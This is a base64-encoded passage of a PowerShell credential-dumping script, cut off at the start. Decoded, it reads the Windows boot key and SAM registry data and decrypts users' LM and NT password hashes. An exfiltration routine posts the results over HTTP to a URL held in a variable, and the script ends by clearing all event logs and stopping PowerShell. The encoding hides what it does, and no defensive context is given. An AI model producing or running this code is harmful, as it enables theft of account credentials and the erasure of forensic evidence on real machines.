AgICRrZXkgKz0gW1NoaWZ0XTo6TGVmdCggJChbaW50XSgkc1syXSkgLWJhbmQgMHgwNyksIDQpIC1ib3IgW1NoaWZ0XTo6UmlnaHQoW2ludF0oJHNbM10pLDQpOwogICAgJGtleSArPSBbU2hpZnRdOjpMZWZ0KCAkKFtpbnRdKCRzWzNdKSAtYmFuZCAweDBGKSwgMykgLWJvciBbU2hpZnRdOjpSaWdodChbaW50XSgkc1s0XSksNSk7CiAgICAka2V5ICs9IFtTaGlmdF06OkxlZnQoICQoW2ludF0oJHNbNF0pIC1iYW5kIDB4MUYpLCAyKSAtYm9yIFtTaGlmdF06OlJpZ2h0KFtpbnRdKCRzWzVdKSw2KTsKICAgICRrZXkgKz0gW1NoaWZ0XTo6TGVmdCggJChbaW50XSgkc1s1XSkgLWJhbmQgMHgzRiksIDEpIC1ib3IgW1NoaWZ0XTo6UmlnaHQoW2ludF0oJHNbNl0pLDcpOwogICAgJGtleSArPSAkKFtpbnRdKCRzWzZdKSAtYmFuZCAweDdGKTsKICAgIDAuLjcgfCAlewogICAgICAgICRrZXlbJF9dID0gW1NoaWZ0XTo6TGVmdCgka2V5WyRfXSwgMSk7CiAgICAgICAgJGtleVskX10gPSAkb2RkX3Bhcml0eVska2V5WyRfXV07CiAgICAgICAgfQogICAgcmV0dXJuICwka2V5Owp9CgpmdW5jdGlvbiBOZXdSQzQoW2J5dGVbXV0ka2V5KQp7CiAgICByZXR1cm4gbmV3LW9iamVjdCBPYmplY3QgfAogICAgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkga2V5ICRrZXkgLVBhc3NUaHJ1IHwKICAgIEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5IFMgJG51bGwgLVBhc3NUaHJ1IHwKICAgIEFkZC1NZW1iZXIgU2NyaXB0TWV0aG9kIGluaXQgewogICAgICAgIGlmICgtbm90ICR0aGlzLlMpCiAgICAgICAgewogICAgICAgICAgICBbYnl0ZVtdXSR0aGlzLlMgPSAwLi4yNTU7CiAgICAgICAgICAgIDAuLjI1NSB8ICUgLWJlZ2lue1tsb25nXSRqPTA7fXsKICAgICAgICAgICAgICAgICRqID0gKCRqICsgJHRoaXMua2V5WyQoJF8gJSAkdGhpcy5rZXkuTGVuZ3RoKV0gKyAkdGhpcy5TWyRfXSkgJSAkdGhpcy5TLkxlbmd0aDsKICAgICAgICAgICAgICAgICR0ZW1wID0gJHRoaXMuU1skX107ICR0aGlzLlNbJF9dID0gJHRoaXMuU1skal07ICR0aGlzLlNbJGpdID0gJHRlbXA7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgfQogICAgfSAtUGFzc1RocnUgfAogICAgQWRkLU1lbWJlciBTY3JpcHRNZXRob2QgImVuY3J5cHQiIHsKICAgICAgICAkZGF0YSA9ICRhcmdzWzBdOwogICAgICAgICR0aGlzLmluaXQoKTsKICAgICAgICAkb3V0YnVmID0gbmV3LW9iamVjdCBieXRlW10gJCgkZGF0YS5MZW5ndGgpOwogICAgICAgICRTMiA9ICR0aGlzLlNbMC4uJHRoaXMuUy5MZW5ndGhdOwogICAgICAgIDAuLiQoJGRhdGEuTGVuZ3RoLTEpIHwgJSAtYmVnaW57JGk9MDskaj0wO30gewogICAgICAgICAgICAkaSA9ICgkaSsxKSAlICRTMi5MZW5ndGg7CiAgICAgICAgICAgICRqID0gKCRqICsgJFMyWyRpXSkgJSAkUzIuTGVuZ3RoOwogICAgICAgICAgICAkdGVtcCA9ICRTMlskaV07JFMyWyRpXSA9ICRTMlskal07JFMyWyRqXSA9ICR0ZW1wOwogICAgICAgICAgICAkYSA9ICRkYXRhWyRfXTsKICAgICAgICAgICAgJGIgPSAkUzJbICQoJFMyWyRpXSskUzJbJGpdKSAlICRTMi5MZW5ndGggXTsKICAgICAgICAgICAgJG91dGJ1ZlskX10gPSAoJGEgLWJ4b3IgJGIpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gLCRvdXRidWY7CiAgICB9IC1QYXNzVGhydQp9CgpmdW5jdGlvbiBkZXNfZW5jcnlwdChbYnl0ZVtdXSRkYXRhLCBbYnl0ZVtdXSRrZXkpCnsKICAgIHJldHVybiAsKGRlc190cmFuc2Zvcm0gJGRhdGEgJGtleSAkdHJ1ZSkKfQoKZnVuY3Rpb24gZGVzX2RlY3J5cHQoW2J5dGVbXV0kZGF0YSwgW2J5dGVbXV0ka2V5KQp7CiAgICByZXR1cm4gLChkZXNfdHJhbnNmb3JtICRkYXRhICRrZXkgJGZhbHNlKQp9CgpmdW5jdGlvbiBkZXNfdHJhbnNmb3JtKFtieXRlW11dJGRhdGEsIFtieXRlW11dJGtleSwgJGRvRW5jcnlwdCkKewogICAgJGRlcyA9IG5ldy1vYmplY3QgU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkRFU0NyeXB0b1NlcnZpY2VQcm92aWRlcjsKICAgICRkZXMuTW9kZSA9IFtTZWN1cml0eS5DcnlwdG9ncmFwaHkuQ2lwaGVyTW9kZV06OkVDQjsKICAgICRkZXMuUGFkZGluZyA9IFtTZWN1cml0eS5DcnlwdG9ncmFwaHkuUGFkZGluZ01vZGVdOjpOb25lOwogICAgJGRlcy5LZXkgPSAka2V5OwogICAgJGRlcy5JViA9ICRrZXk7CiAgICAkdHJhbnNmb3JtID0gJG51bGw7CiAgICBpZiAoJGRvRW5jcnlwdCkgeyR0cmFuc2Zvcm0gPSAkZGVzLkNyZWF0ZUVuY3J5cHRvcigpO30KICAgIGVsc2V7JHRyYW5zZm9ybSA9ICRkZXMuQ3JlYXRlRGVjcnlwdG9yKCk7fQogICAgJHJlc3VsdCA9ICR0cmFuc2Zvcm0uVHJhbnNmb3JtRmluYWxCbG9jaygkZGF0YSwgMCwgJGRhdGEuTGVuZ3RoKTsKICAgIHJldHVybiAsJHJlc3VsdDsKfQoKZnVuY3Rpb24gR2V0LVJlZ0tleUNsYXNzKFtzdHJpbmddJGtleSwgW3N0cmluZ10kc3Via2V5KQp7CiAgICBzd2l0Y2ggKCRLZXkpIHsKICAgICAgICAiSEtDUiIgeyAkbktleSA9IDB4ODAwMDAwMDB9ICNISyBDbGFzc2VzIFJvb3QKICAgICAgICAiSEtDVSIgeyAkbktleSA9IDB4ODAwMDAwMDF9ICNISyBDdXJyZW50IFVzZXIKICAgICAgICAiSEtMTSIgeyAkbktleSA9IDB4ODAwMDAwMDJ9ICNISyBMb2NhbCBNYWNoaW5lCiAgICAgICAgIkhLVSIgIHsgJG5LZXkgPSAweDgwMDAwMDAzfSAjSEsgVXNlcnMKICAgICAgICAiSEtDQyIgeyAkbktleSA9IDB4ODAwMDAwMDV9ICNISyBDdXJyZW50IENvbmZpZwogICAgICAgIGRlZmF1bHQgewogICAgICAgICAgICB0aHJvdyAiSW52YWxpZCBLZXkuIFVzZSBvbmUgb2YgdGhlIGZvbGxvd2luZyBvcHRpb25zIEhLQ1IsIEhLQ1UsIEhLTE0sIEhLVSwgSEtDQyIKICAgICAgICB9CiAgICB9CiAgICAkS0VZUVVFUllWQUxVRSA9IDB4MTsKICAgICRLRVlSRUFEID0gMHgxOTsKICAgICRLRVlBTExBQ0NFU1MgPSAweDNGOwogICAgJHJlc3VsdCA9ICIiOwogICAgW2ludF0kaGtleT0wCiAgICBpZiAoLW5vdCBbUG93ZXJEdW1wLk5hdGl2ZV06OlJlZ09wZW5LZXlFeCgkbmtleSwkc3Via2V5LDAsJEtFWVJFQUQsW3JlZl0kaGtleSkpCiAgICB7CiAgICAgJGNsYXNzVmFsID0gTmV3LU9iamVjdCBUZXh0LlN0cmluZ2J1aWxkZXIgMTAyNAogICAgIFtpbnRdJGxlbiA9IDEwMjQKICAgICBpZiAoLW5vdCBbUG93ZXJEdW1wLk5hdGl2ZV06OlJlZ1F1ZXJ5SW5mb0tleSgkaGtleSwkY2xhc3NWYWwsW3JlZl0kbGVuLDAsW3JlZl0kbnVsbCxbcmVmXSRudWxsLAogICAgICBbcmVmXSRudWxsLFtyZWZdJG51bGwsW3JlZl0kbnVsbCxbcmVmXSRudWxsLFtyZWZdJG51bGwsMCkpCiAgICAgewogICAgICAkcmVzdWx0ID0gJGNsYXNzVmFsLlRvU3RyaW5nKCkKICAgICB9CiAgICAgZWxzZQogICAgIHsKICAgICAgV3JpdGUtRXJyb3IgIlJlZ1F1ZXJ5SW5mb0tleSBmYWlsZWQiOwogICAgIH0KICAgICBbUG93ZXJEdW1wLk5hdGl2ZV06OlJlZ0Nsb3NlS2V5KCRoa2V5KSB8IE91dC1OdWxsCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgV3JpdGUtRXJyb3IgIkNhbm5vdCBvcGVuIGtleSI7CiAgICB9CiAgICByZXR1cm4gJHJlc3VsdDsKfQoKZnVuY3Rpb24gR2V0LUJvb3RLZXkKewogICAgJHMgPSBbc3RyaW5nXTo6Sm9pbigiIiwkKCJKRCIsIlNrZXcxIiwiR0JHIiwiRGF0YSIgfCAle0dldC1SZWdLZXlDbGFzcyAiSEtMTSIgIlNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXExzYVwkXyJ9KSk7CiAgICAkYiA9IG5ldy1vYmplY3QgYnl0ZVtdICQoJHMuTGVuZ3RoLzIpOwogICAgMC4uJCgkYi5MZW5ndGgtMSkgfCAleyRiWyRfXSA9IFtDb252ZXJ0XTo6VG9CeXRlKCRzLlN1YnN0cmluZygkKCRfKjIpLDIpLDE2KX0KICAgICRiMiA9IG5ldy1vYmplY3QgYnl0ZVtdIDE2OwogICAgMHg4LCAweDUsIDB4NCwgMHgyLCAweGIsIDB4OSwgMHhkLCAweDMsIDB4MCwgMHg2LCAweDEsIDB4YywgMHhlLCAweGEsIDB4ZiwgMHg3IHwgJSAtYmVnaW57JGk9MDt9eyRiMlskaV09JGJbJF9dOyRpKyt9CiAgICByZXR1cm4gLCRiMjsKfQoKZnVuY3Rpb24gR2V0LUhCb290S2V5CnsKICAgIHBhcmFtKFtieXRlW11dJGJvb3RrZXkpOwogICAgJGFxd2VydHkgPSBbVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldEJ5dGVzKCIhQCMkJV4mKigpcXdlcnR5VUlPUEF6eGN2Ym5tUVFRUVFRUVFRUVFRKSgqQCYlYDAiKTsKICAgICRhbnVtID0gW1RleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygiMDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIzNDU2Nzg5MDEyMzQ1Njc4OWAwIik7CiAgICAkayA9IEdldC1JdGVtIEhLTE06XFNBTVxTQU1cRG9tYWluc1xBY2NvdW50OwogICAgaWYgKC1ub3QgJGspIHtyZXR1cm4gJG51bGx9CiAgICBbYnl0ZVtdXSRGID0gJGsuR2V0VmFsdWUoIkYiKTsKICAgIGlmICgtbm90ICRGKSB7cmV0dXJuICRudWxsfQogICAgJHJjNGtleSA9IFtTZWN1cml0eS5DcnlwdG9ncmFwaHkuTUQ1XTo6Q3JlYXRlKCkuQ29tcHV0ZUhhc2goJEZbMHg3MC4uMHg3Rl0gKyAkYXF3ZXJ0eSArICRib290a2V5ICsgJGFudW0pOwogICAgJHJjNCA9IE5ld1JDNCAkcmM0a2V5OwogICAgcmV0dXJuICwoJHJjNC5lbmNyeXB0KCRGWzB4ODAuLjB4OUZdKSk7Cn0KCmZ1bmN0aW9uIEdldC1Vc2VyTmFtZShbYnl0ZVtdXSRWKQp7CiAgICBpZiAoLW5vdCAkVikge3JldHVybiAkbnVsbH07CiAgICAkb2Zmc2V0ID0gW0JpdENvbnZlcnRlcl06OlRvSW50MzIoJFZbMHgwYy4uMHgwZl0sMCkgKyAweENDOwogICAgJGxlbiA9IFtCaXRDb252ZXJ0ZXJdOjpUb0ludDMyKCRWWzB4MTAuLjB4MTNdLDApOwogICAgcmV0dXJuIFtUZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRTdHJpbmcoJFYsICRvZmZzZXQsICRsZW4pOwp9CgpmdW5jdGlvbiBHZXQtVXNlckhhc2hlcygkdSwgW2J5dGVbXV0kaGJvb3RrZXkpCnsKICAgIFtieXRlW11dJGVuY19sbV9oYXNoID0gJG51bGw7IFtieXRlW11dJGVuY19udF9oYXNoID0gJG51bGw7CiAgICBpZiAoJHUuSGFzaE9mZnNldCArIDB4MjggLWx0ICR1LlYuTGVuZ3RoKQogICAgewogICAgICAgICRsbV9oYXNoX29mZnNldCA9ICR1Lkhhc2hPZmZzZXQgKyA0OwogICAgICAgICRudF9oYXNoX29mZnNldCA9ICR1Lkhhc2hPZmZzZXQgKyA4ICsgMHgxMDsKICAgICAgICAkZW5jX2xtX2hhc2ggPSAkdS5WWyQoJGxtX2hhc2hfb2Zmc2V0KS4uJCgkbG1faGFzaF9vZmZzZXQrMHgwZildOwogICAgICAgICRlbmNfbnRfaGFzaCA9ICR1LlZbJCgkbnRfaGFzaF9vZmZzZXQpLi4kKCRudF9oYXNoX29mZnNldCsweDBmKV07CiAgICB9CiAgICBlbHNlaWYgKCR1Lkhhc2hPZmZzZXQgKyAweDE0IC1sdCAkdS5WLkxlbmd0aCkKICAgIHsKICAgICAgICAkbnRfaGFzaF9vZmZzZXQgPSAkdS5IYXNoT2Zmc2V0ICsgODsKICAgICAgICAkZW5jX250X2hhc2ggPSBbYnl0ZVtdXSR1LlZbJCgkbnRfaGFzaF9vZmZzZXQpLi4kKCRudF9oYXNoX29mZnNldCsweDBmKV07CiAgICB9CiAgICByZXR1cm4gLChEZWNyeXB0SGFzaGVzICR1LlJpZCAkZW5jX2xtX2hhc2ggJGVuY19udF9oYXNoICRoYm9vdGtleSk7Cn0KCmZ1bmN0aW9uIERlY3J5cHRIYXNoZXMoJHJpZCwgW2J5dGVbXV0kZW5jX2xtX2hhc2gsIFtieXRlW11dJGVuY19udF9oYXNoLCBbYnl0ZVtdXSRoYm9vdGtleSkKewogICAgW2J5dGVbXV0kbG1oYXNoID0gJGVtcHR5X2xtOyBbYnl0ZVtdXSRudGhhc2g9JGVtcHR5X250OwogICAgIyBMTSBIYXNoCiAgICBpZiAoJGVuY19sbV9oYXNoKQogICAgewogICAgICAgICRsbWhhc2ggPSBEZWNyeXB0U2luZ2xlSGFzaCAkcmlkICRoYm9vdGtleSAkZW5jX2xtX2hhc2ggJGFsbXBhc3N3b3JkOwogICAgfQoKICAgICMgTlQgSGFzaAogICAgaWYgKCRlbmNfbnRfaGFzaCkKICAgIHsKICAgICAgICAkbnRoYXNoID0gRGVjcnlwdFNpbmdsZUhhc2ggJHJpZCAkaGJvb3RrZXkgJGVuY19udF9oYXNoICRhbnRwYXNzd29yZDsKICAgIH0KCiAgICByZXR1cm4gLCgkbG1oYXNoLCRudGhhc2gpCn0KCmZ1bmN0aW9uIERlY3J5cHRTaW5nbGVIYXNoKCRyaWQsW2J5dGVbXV0kaGJvb3RrZXksW2J5dGVbXV0kZW5jX2hhc2gsW2J5dGVbXV0kbG1udHN0cikKewogICAgJGRlc2tleXMgPSBzaWRfdG9fa2V5ICRyaWQ7CiAgICAkbWQ1ID0gW1NlY3VyaXR5LkNyeXB0b2dyYXBoeS5NRDVdOjpDcmVhdGUoKTsKICAgICRyYzRfa2V5ID0gJG1kNS5Db21wdXRlSGFzaCgkaGJvb3RrZXlbMC4uMHgwZl0gKyBbQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJHJpZCkgKyAkbG1udHN0cik7CiAgICAkcmM0ID0gTmV3UkM0ICRyYzRfa2V5OwogICAgJG9iZmtleSA9ICRyYzQuZW5jcnlwdCgkZW5jX2hhc2gpOwogICAgJGhhc2ggPSAoZGVzX2RlY3J5cHQgICRvYmZrZXlbMC4uN10gJGRlc2tleXNbMF0pICsKICAgICAgICAoZGVzX2RlY3J5cHQgJG9iZmtleVs4Li4kKCRvYmZrZXkuTGVuZ3RoIC0gMSldICRkZXNrZXlzWzFdKTsKICAgIHJldHVybiAsJGhhc2g7Cn0KCmZ1bmN0aW9uIEdldC1Vc2VyS2V5cwp7CiAgICBscyBIS0xNOlxTQU1cU0FNXERvbWFpbnNcQWNjb3VudFxVc2VycyB8CiAgICAgICAgd2hlcmUgeyRfLlBTQ2hpbGROYW1lIC1tYXRjaCAiXlswLTlBLUZhLWZdezh9JCJ9IHwKICAgICAgICAgICAgQWRkLU1lbWJlciBBbGlhc1Byb3BlcnR5IEtleU5hbWUgUFNDaGlsZE5hbWUgLVBhc3NUaHJ1IHwKICAgICAgICAgICAgQWRkLU1lbWJlciBTY3JpcHRQcm9wZXJ0eSBSaWQge1tDb252ZXJ0XTo6VG9JbnQzMigkdGhpcy5QU0NoaWxkTmFtZSwgMTYpfSAtUGFzc1RocnUgfAogICAgICAgICAgICBBZGQtTWVtYmVyIFNjcmlwdFByb3BlcnR5IFYge1tieXRlW11dKCR0aGlzLkdldFZhbHVlKCJWIikpfSAtUGFzc1RocnUgfAogICAgICAgICAgICBBZGQtTWVtYmVyIFNjcmlwdFByb3BlcnR5IFVzZXJOYW1lIHtHZXQtVXNlck5hbWUoJHRoaXMuR2V0VmFsdWUoIlYiKSl9IC1QYXNzVGhydSB8CiAgICAgICAgICAgIEFkZC1NZW1iZXIgU2NyaXB0UHJvcGVydHkgSGFzaE9mZnNldCB7W0JpdENvbnZlcnRlcl06OlRvVUludDMyKCR0aGlzLkdldFZhbHVlKCJWIilbMHg5Yy4uMHg5Zl0sMCkgKyAweENDfSAtUGFzc1RocnUKfQoKZnVuY3Rpb24gRHVtcEhhc2hlcwp7CiAgICBMb2FkQXBpCiAgICAkYm9vdGtleSA9IEdldC1Cb290S2V5OwogICAgJGhib290S2V5ID0gR2V0LUhCb290S2V5ICRib290a2V5OwogICAgR2V0LVVzZXJLZXlzIHwgJXsKICAgICAgICAkaGFzaGVzID0gR2V0LVVzZXJIYXNoZXMgJF8gJGhCb290S2V5OwogICAgICAgICJ7MH06ezF9OnsyfTp7M306OjoiIC1mICgkXy5Vc2VyTmFtZSwkXy5SaWQsCiAgICAgICAgICAgIFtCaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkaGFzaGVzWzBdKS5SZXBsYWNlKCItIiwiIikuVG9Mb3dlcigpLAogICAgICAgICAgICBbQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJGhhc2hlc1sxXSkuUmVwbGFjZSgiLSIsIiIpLlRvTG93ZXIoKSk7CiAgICB9Cn0KCgppZigkZXhmaWwgLWVxICRUcnVlKQp7CiAgICBmdW5jdGlvbiBEby1FeGZpbHRyYXRpb24KICAgIHsgICAKICAgICAgICAkcGFzdGVfbmFtZSA9ICRlbnY6Q09NUFVURVJOQU1FICsgIjogSGFzaGVzIgogICAgICAgIGZ1bmN0aW9uIHBvc3RfaHR0cCgkdXJsLCRwYXJhbWV0ZXJzKSAKICAgICAgICB7IAogICAgICAgICAgICAkaHR0cF9yZXF1ZXN0ID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0IE1zeG1sMi5YTUxIVFRQIAogICAgICAgICAgICAkaHR0cF9yZXF1ZXN0Lm9wZW4oIlBPU1QiLCAkdXJsLCAkZmFsc2UpIAogICAgICAgICAgICAkaHR0cF9yZXF1ZXN0LnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtdHlwZSIsImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpIAogICAgICAgICAgICAkaHR0cF9yZXF1ZXN0LnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtbGVuZ3RoIiwgJHBhcmFtZXRlcnMubGVuZ3RoKTsgCiAgICAgICAgICAgICRodHRwX3JlcXVlc3Quc2V0UmVxdWVzdEhlYWRlcigiQ29ubmVjdGlvbiIsICJjbG9zZSIpIAogICAgICAgICAgICAkaHR0cF9yZXF1ZXN0LnNlbmQoJHBhcmFtZXRlcnMpIAogICAgICAgICAgICAkc2NyaXB0OnNlc3Npb25fa2V5PSRodHRwX3JlcXVlc3QucmVzcG9uc2VUZXh0IAogICAgICAgIH0gCgogICAgICAgIGZ1bmN0aW9uIEdldC1NRDUoKQogICAgICAgIHsKICAgICAgICAgICAgI2h0dHA6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvMTA1MjEwNjEvaG93LXRvLWdldC1hLW1kNS1jaGVja3N1bS1pbi1wb3dlcnNoZWxsCiAgICAgICAgICAgICRtZDUgPSBuZXctb2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5Lk1ENUNyeXB0b1NlcnZpY2VQcm92aWRlcgogICAgICAgICAgICAkdXRmOCA9IG5ldy1vYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LlVURjhFbmNvZGluZwogICAgICAgICAgICAkaGFzaCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJG1kNS5Db21wdXRlSGFzaCgkdXRmOC5HZXRCeXRlcygkcGFzc3dvcmQpKSkuUmVwbGFjZSgiLSIsICIiKS5Ub0xvd2VyKCkKICAgICAgICAgICAgcmV0dXJuICRoYXNoCiAgICAgICAgfQoKICAgICAgICBpZiAoJGtleW91dG9wdGlvbiAtZXEgIjAiKQogICAgICAgIHsKICAgICAgICAKICAgICAgICAgICAgJHBhc3RldmFsdWUKICAgICAgICB9CgogICAgfQogICAgR2V0LVBhc3NIYXNoZXMKICAgIERvLUV4ZmlsdHJhdGlvbgp9CgplbHNlCnsKICAgIEdldC1QYXNzSGFzaGVzIAogICAgJHBhc3RldmFsdWUgfCBPdXQtRmlsZSAkU2NyaXB0UGF0aFxEdW1wXHNhbVxzYW1oYXNoLlBXRFVNUAogICAgJHBhc3RldmFsdWUgfCBPdXQtRmlsZSAkU2NyaXB0UGF0aFxEdW1wXHNhbVxzYW1oYXNoLnR4dAp9CiAgICAKR2V0LVdpbkV2ZW50IC1MaXN0TG9nICogLUZvcmNlIHwgJSB7IFdldnR1dGlsLmV4ZSBjbCAkXy5sb2duYW1lIH0JCgkKU3RvcC1Qcm9jZXNzIC1wcm9jZXNzbmFtZSBwb3dlcnNoZWxsCgo=
